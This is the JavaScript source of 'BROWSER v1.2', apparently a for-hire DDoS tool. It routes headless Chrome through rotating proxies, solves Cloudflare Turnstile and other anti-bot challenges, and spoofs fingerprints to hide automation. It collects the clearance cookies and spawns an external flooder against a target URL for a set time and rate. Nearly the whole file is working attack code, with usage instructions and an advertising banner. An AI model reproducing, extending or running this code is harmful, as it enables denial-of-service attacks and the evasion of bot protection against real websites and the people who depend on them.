/*
    BROWSER (v1.2)
    
    (16 September, 2024)

    Features:
    - Cloudflare Turnstile Solver
    - UAM & HTTPDDOS bypass

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga

    sudo apt-get install -y libnss3 libatk-bridge2.0-0 libx11-xcb1 libxcomposite1 libxcursor1 libxdamage1 libxi6 libxtst6 libnss3 libxrandr2 libgbm1 libasound2 libpangocairo-1.0-0 libpango-1.0-0 libcups2

    npm install puppeteer puppeteer-real-browser fingerprint-generator fingerprint-injector colors
    npx puppeteer browsers install chrome@stable
*/

import { connect } from "puppeteer-real-browser";
import { FingerprintGenerator } from "fingerprint-generator";
import { FingerprintInjector } from "fingerprint-injector";
import timers from "timers/promises";

import { spawn } from "child_process";
import fs from "fs";
import cluster from "cluster";
import colors from "colors";

// process.env.CHROME_PATH = '/root/.cache/puppeteer/chrome/linux-129.0.6668.70/chrome-linux64/chrome';

process.on("uncaughtException", function (error) {
  console.log(error);
});
process.on("unhandledRejection", function (error) {
  console.log(error);
});

process.setMaxListeners(0);

if (process.argv.length < 7) {
  console.clear();
  console.log(`\n                      ${"TRUMPROXY RENEW".red.bold} ${
    "|".bold
  } ${"an army for hire".white.bold}

                                ${" 18 September, 2025 ".bgWhite.black.italic}

                                    ${"t.me/cutihaclao".cyan}`);
  console.log(`
    ${"🚀 ".bold}${"BROWSER v1.2".bold.magenta}  |  ${
    `${"Cloudflare Captcha bypass".bold.yellow}, new browser rendering modes,
                        optional random rate of requests, reserve cookie system,
                        invisible turnstile solver & new browser fingerprints.`
      .italic
  }

    —————————————————————————————————————————————————————————————————————————————

    ${"❓".bold} ${"USAGE".bold.underline}:

        ${
          `xvfb-run node BROWSER.js ${"[".red.bold}target${"]".red.bold} ${
            "[".red.bold
          }time${"]".red.bold} ${"[".red.bold}forks${"]".red.bold} ${
            "[".red.bold
          }rate${"]".red.bold} ${"[".red.bold}proxy${"]".red.bold} ${
            "(".red.bold
          }options${")".red.bold}`.italic
        }
        ${
          "xvfb-run node BROWSER.js https://trumproxy.net 90 6 30 http.txt --fp false"
            .italic
        }

    ${"⚙️".bold}  ${"OPTIONS".bold.underline}:

        --debug    ${"true".green}/${"false".red}    ${"~".red.bold}    ${
    "Enable script debugging.".italic
  }     [default: ${"true".green}]
        --head     ${"true".green}/${"false".red}    ${"~".red.bold}    ${
    "Browser headless mode.".italic
  }       [default: ${"false".red}]
        --auth     ${"true".green}/${"false".red}    ${"~".red.bold}    ${
    "Proxy authentication.".italic
  }        [default: ${"false".red}]
        --rate     ${"true".green}/${"false".red}    ${"~".red.bold}    ${
    "Random request rate.".italic
  }         [default: ${"false".red}]
        --fp       ${"true".green}/${"false".red}    ${"~".red.bold}    ${
    "Browser fingerprint.".italic
  }         [default: ${"false".red}]
        
        --threads      ${"10".yellow}        ${"~".red.bold}    ${
    "Number of flooder forks.".italic
  }     [default: ${"1".yellow}]
        --cookies      ${"10".yellow}        ${"~".red.bold}    ${
    "Amount of spare cookies.".italic
  }     [default: ${"0".yellow}]
`);
  process.exit(0);
}

const target = process.argv[2]; // || 'https://localhost:443';
const duration = parseInt(process.argv[3]); // || 0;
const threads = parseInt(process.argv[4]) || 10;
var rate = parseInt(process.argv[5]) || 64;
const proxyfile = process.argv[6] || "proxies.txt";

let usedProxies = {};

function error(msg) {
  console.log(`   ${"[".red}${"error".bold}${"]".red} ${msg}`);
  process.exit(0);
}

function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length
    ? process.argv[index + 1]
    : undefined;
}

function exit() {
  for (const flooder of flooders) {
    flooder.kill();
  }
  log(1, `${"Attack Ended!".bold}`);
  process.exit(0);
}

process
  .on("SIGTERM", () => {
    exit();
  })
  .on("SIGINT", () => {
    exit();
  });

const options = [
  // BROWSER OPTIONS
  { flag: "--debug", value: get_option("--debug"), default: true },
  { flag: "--head", value: get_option("--head"), default: false },
  { flag: "--auth", value: get_option("--auth"), default: false },
  { flag: "--rate", value: get_option("--rate"), default: false },
  { flag: "--fp", value: get_option("--fp"), default: false },

  { flag: "--threads", value: get_option("--threads"), default: 1 },
  { flag: "--cookies", value: get_option("--cookies"), default: 0 },

  // FLOODER OPTIONS
  { flag: "--reset", value: get_option("--reset") },
  { flag: "--ratelimit", value: get_option("--ratelimit") },
  { flag: "--randrate", value: get_option("--randrate") },
  { flag: "--randpath", value: get_option("--randpath") },
  { flag: "--close", value: get_option("--close") },
  { flag: "--delay", value: get_option("--delay") },
  { flag: "--streams", value: get_option("--streams") },
];

function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find((option) => option.flag === flag);
  if (option === undefined) {
    return false;
  }

  const optionValue = option.value;

  if (option.value === undefined && option.default) {
    return option.default;
  }

  if (optionValue === "true" || optionValue === true) {
    return true;
  } else if (optionValue === "false" || optionValue === false) {
    return false;
  } else if (!isNaN(optionValue)) {
    return parseInt(optionValue);
  } else {
    return false;
  }
}

if (!proxyfile) {
  error("Invalid proxy file!");
}
if (!target || !target.startsWith("https://")) {
  error("Invalid target address (https only)!");
}
if (!duration || isNaN(duration) || duration <= 0) {
  error("Invalid duration format!");
}
if (!threads || isNaN(threads) || threads <= 0) {
  error("Invalid threads format!");
}
if (!rate || isNaN(rate) || rate <= 0) {
  error("Invalid ratelimit format!");
}

// if (rate > 90) { error("Invalid ratelimit range! (max 90)") }

const raw_proxies = fs
  .readFileSync(proxyfile, "utf-8")
  .toString()
  .replace(/\r/g, "")
  .split("\n")
  .filter((word) => word.trim().length > 0);
if (raw_proxies.length <= 0) {
  error("Proxy file is empty!");
}
var parsed = new URL(target);

function shuffle_proxies(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

const proxies = shuffle_proxies(raw_proxies);

var headless = enabled("head");
headless = headless ? true : !headless ? false : true;

var debug = enabled("debug");
debug = debug ? true : !debug ? false : true;

var cookiesOpt = enabled("cookies");

const cache = [];
const flooders = [];

function log(type, string) {
  let script;
  switch (type) {
    case 1:
      script = "js/browser";
      break;
    case 2:
      script = "js/flooder";
      break;
    default:
      script = "js/browser";
      break;
  }
  let d = new Date();
  let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
  let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();

  if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
    hours = "undefined";
    minutes = "undefined";
    seconds = "undefined";
  }

  if (enabled("debug")) {
    console.log(
      `(${`${hours}:${minutes}:${seconds}`.cyan}) [${colors.magenta.bold(
        script
      )}] | ${string}`
    );
  }
}

function random_int(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function flooder(headers, proxy, ua, cookie) {
  var THREADS = 1;
  const flooder_threads = enabled("threads");
  if (
    flooder_threads &&
    !isNaN(flooder_threads) &&
    typeof flooder_threads !== "boolean"
  ) {
    THREADS = flooder_threads;
  }

  if (cookie.includes("cf_clearance") && rate > 90) {
    rate = 90;
  }
  const args = [
    //"flood.go",
    "-url",
    target,
    "-time",
    60,
    "-rate",
    rate,
    "-ua",
    ua,
    "-cookie",
    cookie,
    "-ip",
    proxy,
    "-flood",
    //"-auth",
    //"-limit", 10,
    //"-threads", 10,
    //"-debug",
    //1,
    "-end",
    "-proxy",
    proxyfile,
    "-reset",
    //"-close",
  ];

  if (enabled("auth")) {
    args.push("-auth");
  }
  if (enabled("debug")) {
    args.push("-debug");
    args.push("1");
  }

  log(2, `(${colors.magenta(proxy)}) ${colors.bold("Spawning Flooder")}`);

  const flooder_process = spawn("./flood", args, {
    stdio: "pipe",
  });

  flooders.push(flooder_process);

  flooder_process.stdout.on("data", (data) => {
    const output = data
      .toString()
      .split("\n")
      .filter((line) => line.trim() !== "")
      .join("\n");

    log(2, output);
    if (output.includes("Restart Browser")) {
      log(2, "Restarting Browser".bold);
      if (cache.length > 0) {
        const random_index = Math.floor(Math.random() * cache.length);
        const item = cache[random_index];
        flooder(undefined, item["proxy"], item["ua"], item["cookie"]);
        cache.splice(random_index, 1);
      } else {
        main(false);
      }
      return;
    }
  });

  flooder_process.stderr.on("data", (data) => {
    log(
      2,
      `(${colors.magenta(proxy)}) ${"Error".bold}: ${data.toString("utf8")}`
    );
    flooder_process.kill();
    log(
      2,
      `(${colors.magenta(proxy)}) ${"Restarting main due to flooder error."}`
    );
    main(false);
  });

  flooder_process.on("error", (err) => {
    log(2, `(${colors.magenta(proxy)}) ${"Error".bold}: ${err.message}`);
    flooder_process.kill();
    log(
      2,
      `(${colors.magenta(
        proxy
      )}) ${"Restarting main due to flooder process error."}`
    );
    main(false);
  });

  flooder_process.on("close", (code) => {
    log(
      2,
      `(${colors.magenta(proxy)}) ${
        "Close".bold
      }: Process exited with code ${code}`
    );
    if (code !== 0) {
      log(
        2,
        `(${colors.magenta(
          proxy
        )}) ${"Restarting main because flooder exited with non-zero code."}`
      );
      main(false);
    }
    main(false);
  });
}

async function main(reserve) {
  return new Promise(async (resolve) => {
    let proxy = proxies[~~(Math.random() * proxies.length)];
    while (usedProxies[proxy]) {
      if (Object.keys(usedProxies).length == proxies.length) {
        usedProxies = {};
        resolve(main(reserve));
        return;
      }
      proxy = proxies[~~(Math.random() * proxies.length)];
    }
    usedProxies[proxy] = true;

    let [proxy_host, proxy_port] = proxy.split(":");

    let Browser, Page;
    let title_interval = null;
    let isCleaningUp = false;
    const cleanUpAndRetry = async (reason = "unknown") => {
      if (isCleaningUp) {
        // log(1, `(${colors.magenta(proxy)}) CleanUp already in progress. Skipping retry.`);
        return;
      }
      isCleaningUp = true;

      if (title_interval) {
        clearInterval(title_interval);
        title_interval = null;
      }
      if (Page) {
        try {
          if (!Page.isClosed()) {
            await Page.close();
          }
        } catch (closeErr) {
          // log(1, `(${colors.magenta(proxy)}) Page close error: ${closeErr.message.split('\n')[0]}`);
        }
        Page = null;
      }
      if (Browser) {
        try {
          if (Browser.isConnected()) {
            await Browser.close();
          }
        } catch (closeErr) {
          // log(1, `(${colors.magenta(proxy)}) Browser close error: ${closeErr.message.split('\n')[0]}`);
        }
        Browser = null;
      }

      // log(1, `(${colors.magenta(proxy)}) Retry reason: ${reason}`);
      isCleaningUp = false;
      resolve(main(reserve));
    };

    try {
      const args = [];
      let headers;

      let proxy_plugin = {
        host: proxy_host,
        port: proxy_port,
      };

      if (enabled("auth")) {
        let [host, port, username, password] = proxy.split(":");
        proxy_plugin = {
          host: host,
          port: parseInt(port),
          username: username,
          password: password,
        };
      }

      let connectionResult;
      try {
        connectionResult = await connect({
          turnstile: true,
          headless: headless,
          args: [],
          customConfig: {},
          connectOption: {},
          ignoreAllFlags: false,
          proxy: proxy_plugin,
        });
      } catch (err) {
        log(
          1,
          `(${colors.magenta(proxy)}) Connect failed: ${
            err.message.split("\n")[0]
          }`
        );
        return cleanUpAndRetry("connect_failure");
      }

      if (
        !connectionResult ||
        !connectionResult.page ||
        !connectionResult.browser
      ) {
        log(1, `(${colors.magenta(proxy)}) Connection object invalid.`);
        return cleanUpAndRetry("invalid_connection_object");
      }

      Browser = connectionResult.browser;
      Page = connectionResult.page;

      if (enabled("fp")) {
        const randomVer = Math.floor(Math.random() * (142 - 135 + 1)) + 135;
        const ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVer}.0.0.0 Safari/537.36`;
        await Page.setUserAgent(ua);
        await Page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });
        await Page.setViewport({
          width: 1440,
          height: 900,
          deviceScaleFactor: 2,
        });

        await Page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, "platform", {
            get: () => "MacIntel",
          });
          Object.defineProperty(navigator, "webdriver", { get: () => false });

          Object.defineProperty(navigator, "hardwareConcurrency", {
            get: () => 8,
          });
          try {
            Object.defineProperty(navigator, "deviceMemory", { get: () => 8 });
          } catch (e) {}
          try {
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function (p) {
              if (p === 37445) return "Intel Inc.";
              if (p === 37446) return "Intel(R) Iris(R) Graphics";
              return getParameter.call(this, p);
            };
          } catch (e) {}
        });

        // Nếu bạn muốn lấy headers từ FingerprintInjector/Generator thay vì chỉ UA
        // Bạn có thể giữ hoặc loại bỏ phần này tùy theo cách bạn muốn FingerprintInjector hoạt động
        // const fingerprintInjector = new FingerprintInjector();
        // const fingerprintGenerator = new FingerprintGenerator({
        //   devices: ["desktop"],
        //   browsers: [{ name: "chrome", minVersion: random_int(122, 126) }],
        //   operatingSystems: ["windows"],
        // });
        // const fingerprint = fingerprintGenerator.getFingerprint();
        // headers = JSON.stringify(fingerprint.headers);
        // await fingerprintInjector.attachFingerprintToPuppeteer(
        //   Page,
        //   fingerprint
        // );
      }

      var userAgent = await Page.evaluate(() => {
        return navigator.userAgent;
      });

      if (userAgent.includes("Headless")) {
        userAgent = userAgent.replace("Headless", "");
        await Page.setUserAgent(userAgent);
      }

      log(
        1,
        `(${colors.magenta(proxy)}) ${colors.bold(
          "User-Agent"
        )}: ${colors.yellow(userAgent)}`
      );

      let response;
      try {
        response = await Page.goto(target, {
          waitUntil: "domcontentloaded",
          referer: "https://www.google.com/",
        });
      } catch (err) {
        log(
          1,
          `(${colors.magenta(proxy)}) Page goto failed: ${
            err.message.split("\n")[0]
          }`
        );
        return cleanUpAndRetry("goto_failure");
      }

      const statusCode = response.status();
      const errorStatusCodes = [407];
      if (errorStatusCodes.includes(statusCode)) {
        log(
          1,
          `(${colors.magenta(proxy)}) ${colors.bold("Status")}: ${colors.red(
            statusCode
          )} - Retrying.`
        );
        return cleanUpAndRetry("status_code_error");
      }

      let titles = [];
      let err_count = 0;

      title_interval = setInterval(async () => {
        try {
          if (!Page || Page.isClosed()) {
            return cleanUpAndRetry("page_closed_in_title_check");
          }

          const currentTitle = await Page.title();

          if (currentTitle.startsWith("Failed to load URL ")) {
            log(1, `(${colors.magenta(proxy)}) Failed to load URL. Retrying.`);
            return cleanUpAndRetry("failed_to_load_url");
          }

          if (!currentTitle) {
            titles.push(parsed.hostname);
            clearInterval(title_interval);
            title_interval = null;
            return;
          }

          if (currentTitle !== titles[titles.length - 1]) {
            log(
              1,
              `(${colors.magenta(proxy)}) ${colors.bold(
                "Title"
              )}: ${colors.italic(currentTitle)}`
            );
          }

          titles.push(currentTitle);

          if (
            !currentTitle.includes("Just a moment...") &&
            !currentTitle.includes("Security Check")
          ) {
            clearInterval(title_interval);
            title_interval = null;
            return;
          }
        } catch (err) {
          err_count += 1;
          if (err_count >= 5) {
            log(
              1,
              `(${colors.magenta(proxy)}) Title check error: Too many errors.`
            );
            return cleanUpAndRetry("too_many_title_errors");
          }
          log(
            1,
            `(${colors.magenta(proxy)}) Title check minor error: ${
              err.message.split("\n")[0]
            }`
          );
        }
      }, 1000).unref();

      let protections = [
        "just a moment...",
        "ddos-guard",
        "403 forbidden",
        "security check",
        "One more step",
        "Sucuri WebSite Firewall",
      ];

      await new Promise(async (resolvePromise) => {
        const checkProtection = async () => {
          if (!Page || Page.isClosed()) {
            log(
              1,
              `(${colors.magenta(proxy)}) Page closed during protection wait.`
            );
            return false;
          }
          if (title_interval === null) {
            return false;
          }
          if (titles.length === 0) return true;
          return (
            protections.filter(
              (a) => titles[titles.length - 1].toLowerCase().indexOf(a) != -1
            ).length > 0
          );
        };

        while (await checkProtection()) {
          await timers.setTimeout(200, null, { ref: false });
        }
        resolvePromise(null);
      });

      if (title_interval) {
        clearInterval(title_interval);
        title_interval = null;
      }

      if (!Page || Page.isClosed()) {
        log(1, `(${colors.magenta(proxy)}) Page closed after protection wait.`);
        return cleanUpAndRetry("page_closed_after_protection");
      }

      var cookies = await Page.cookies();
      const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

      log(
        1,
        `(${colors.magenta(proxy)}) ${colors.bold("Cookies")}: ${colors.green(
          _cookie
        )}`
      );

      await Page.close();
      await Browser.close();
      Page = null;
      Browser = null;

      if (!reserve) {
        flooder(headers, proxy, userAgent, _cookie);
      } else {
        cache.push({
          proxy: proxy,
          ua: userAgent,
          cookie: _cookie,
        });
      }

      resolve();
    } catch (err) {
      log(
        1,
        `(${colors.magenta(proxy)}) General error: ${
          err.message.split("\n")[0]
        }`
      );
      return cleanUpAndRetry("general_main_error");
    }
  });
}

if (cluster.isPrimary) {
  setTimeout(() => {
    exit();
  }, Number(duration) * 1000);

  for (let i = 0; i < threads; i++) {
    main(false);
  }

  if (!isNaN(cookiesOpt) && typeof cookiesOpt !== "boolean") {
    var x = 1;
    const cookie_interval = setInterval(() => {
      x++;
      if (x >= cookiesOpt) {
        clearInterval(cookie_interval);
      }
      main(true);
    }, 3000);
  }
}
